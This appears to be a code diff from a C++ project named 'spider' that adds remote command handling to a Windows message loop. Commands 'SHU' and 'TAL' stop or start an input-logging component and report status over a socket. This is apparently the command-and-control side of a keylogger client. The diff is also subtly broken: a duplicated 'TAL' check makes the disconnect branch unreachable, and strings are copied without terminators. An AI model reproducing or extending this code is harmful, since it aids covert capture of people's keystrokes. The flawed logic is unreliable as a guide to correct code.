@@ -70,9 +70,45 @@ namespace spider
 		protocolConnection();
 		inputHandler->startLogging(true, true);
 
+		PackageAnswer2 answer;
+
 		MSG message;
 		while (GetMessage(&message, NULL, 0, 0))
 		{
+			if (message.lParam)
+			{
+				if (!strncmp((char*)message.lParam, "SHU", 3))
+				{
+					if (!inputHandler->stopLogging(true, true))
+					{
+						answer.code = 302;
+						strncpy(answer.cmd, "SHU", 3);
+					}
+					else
+					{
+						answer.code = 103;
+						strncpy(answer.cmd, "SHU", 3);
+					}
+					sock.write<PackageAnswer2>(spider::PacketSerializer<PackageAnswer2>(
+						sizeof(PackageHeader) + sizeof(PackageAnswer2), 666, answer));
+				}
+				else if (!strncmp((char*)message.lParam, "TAL", 3))
+				{
+					inputHandler->startLogging(true, true);
+					answer.code = 302;
+					strncpy(answer.cmd, "TAL", 3);
+					sock.write<PackageAnswer2>(spider::PacketSerializer<PackageAnswer2>(
+						sizeof(PackageHeader) + sizeof(PackageAnswer2), 666, answer));
+				}
+				else if (!strncmp((char*)message.lParam, "TAL", 3))
+				{
+					answer.code = 208;
+					strncpy(answer.cmd, "DEC", 3);
+					sock.write<PackageAnswer2>(spider::PacketSerializer<PackageAnswer2>(
+						sizeof(PackageHeader) + sizeof(PackageAnswer2), 666, answer));
+					sock.close();
+				}
+			}
 			TranslateMessage(&message);
 			DispatchMessage(&message);
 		}
